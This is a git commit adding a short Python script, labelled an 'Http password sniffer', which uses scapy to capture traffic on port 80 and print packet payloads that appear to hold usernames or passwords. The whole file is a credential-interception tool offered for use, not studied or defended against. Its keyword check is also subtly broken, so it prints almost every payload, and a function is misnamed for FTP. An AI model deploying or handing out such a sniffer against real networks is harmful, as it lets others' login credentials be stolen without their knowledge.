769514847d0a9ae4ef2b7fee8170881e6745f5e9
glen-s-abraham <56243356+glen-s-abraham@users.noreply.github.com>
2019-12-09 02:04:25 -0500

    Add files via upload
    Http password sniffer

---
+++ httpsniffer.py
@@ -0,0 +1,19 @@
+import scapy.all as scapy
+import re
+wordlist=['username','user','UserName','userName','Username','usr','pass','PASS','password','Password']
+def ftpSniff(pkt):
+	
+	if pkt.haslayer(scapy.TCP):
+		if pkt.getlayer(scapy.TCP).dport==80:
+			if not(pkt.getlayer(scapy.Raw)==None):
+				addr=str(pkt.getlayer(scapy.IP).dst)
+				text=str(pkt.getlayer(scapy.Raw))
+				for word in wordlist:
+					if text.find(word):
+						print(text)
+						break
+def main():
+	intrface=str(input("Enter interface to sniff"))
+	print("Starting sniffer on "+intrface)
+	scapy.sniff(iface=intrface,prn=ftpSniff)
+main()
